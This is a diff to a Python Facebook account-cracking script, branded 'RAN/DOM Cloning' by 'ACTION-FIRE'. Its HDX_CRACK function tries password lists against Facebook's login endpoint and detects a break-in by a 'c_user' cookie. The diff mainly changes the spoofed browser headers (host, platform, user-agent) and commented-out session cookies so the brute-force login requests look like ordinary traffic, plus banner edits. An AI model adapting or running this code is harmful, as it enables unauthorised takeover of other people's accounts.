@@ -132,10 +132,10 @@ logo = ("""
 \033[1;91m----------------------------------------------------
 \033[1;32m[\033[1;91m✔︎\033[1;32m] Author    \033[1;32m : ACTION-FIRE                 
 \033[1;32m[\033[1;91m✔︎\033[1;32m] Facebook   \033[1;32m: Ft Alvi                
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Github    \033[1;32m : github.com/ACTION-FIRE
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Status    	\033[1;32m: FREE TRIAL                      
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Version  	\033[1;32m: 3.2.1                  
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Tools    	\033[1;32m: RAN/DOM Cloning        
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Github    \033[1;32m : ACTION-FIRE
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Status     \033[1;32m: FREE TRIAL                      
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Version    \033[1;32m: 3.2.1                  
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Tools      \033[1;32m: RAN/DOM Cloning        
 \033[1;91m----------------------------------------------------""")
 def qsbuy():
         try:
@@ -224,10 +224,10 @@ logo = ("""
 \033[1;91m----------------------------------------------------
 \033[1;32m[\033[1;91m✔︎\033[1;32m] Author    \033[1;32m : ACTION-FIRE                 
 \033[1;32m[\033[1;91m✔︎\033[1;32m] Facebook   \033[1;32m: Ft Alvi                
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Github    \033[1;32m : github.com/ACTION-FIRE
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Status    	\033[1;32m: FREE TRIAL                      
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Version  	\033[1;32m: 3.2.1                  
-\033[1;32m[\033[1;91m✔︎\033[1;32m] Tools    	\033[1;32m: RAN/DOM Cloning        
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Github    \033[1;32m : ACTION-FIRE
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Status     \033[1;32m: FREE TRIAL                      
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Version    \033[1;32m: 3.2.1                  
+\033[1;32m[\033[1;91m✔︎\033[1;32m] Tools      \033[1;32m: RAN/DOM Cloning        
 \033[1;91m----------------------------------------------------""")
 loop = 0
 oks = []
@@ -446,24 +446,22 @@ def HDX_CRACK(ids,passlist,tl):
             "pass":pas,
             "login":"Log In"}
             header_freefb = {
-            'authority': 'free.facebook.com',
-            'method': 'POST',
-            'scheme': 'https',
+            'authority': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': 'en-AS,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
             'cache-control': 'max-age=0',
-    # 'cookie': 'datr=zJwOZDs1t-a-6Z7KNbPV6QeW; sb=zJwOZCVWQpJ-3m24d51EU3CX; m_pixel_ratio=2; wd=360x632; fr=0GRuYsQZbEVKKMHHJ..BkDpzM.Kh.AAA.0.0.BkDpzd.AWVt2pkuGF8',
-            'origin': 'https://free.facebook.com',
-            'referer': 'https://free.facebook.com/',
+            # 'cookie': 'datr=Per0Y9fUj5SCI7nY5kNnLkPu; sb=Per0Y2RiqavlGE_nKulvlada; vpd=v1%3B772x412x1.75; m_pixel_ratio=1.75; wd=980x1836; fr=0QIYQe6jUJiWmUwaI.AWUdkhHQowp9s_sTiinz3HHSF3Q.BkA9Ts.Ou.AAA.0.0.BkDs8E.AWWiNXnt2IE',
             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
+            'sec-fetch-site': 'cross-site',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': ua}
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
+}
+
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
